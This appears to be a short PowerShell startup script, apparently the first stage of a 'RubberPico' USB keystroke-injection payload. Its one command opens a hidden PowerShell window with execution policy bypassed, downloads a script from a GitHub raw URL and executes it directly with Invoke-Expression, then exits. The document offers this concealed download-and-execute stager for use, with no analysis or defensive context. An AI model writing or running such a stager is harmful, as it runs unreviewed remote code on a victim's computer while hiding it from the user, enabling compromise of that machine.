# script de iniciar 
Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command ""Invoke-Expression (Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/jndr332/RubberPico/refs/heads/main/script.ps1').Content""" -WindowStyle Hidden 

exit
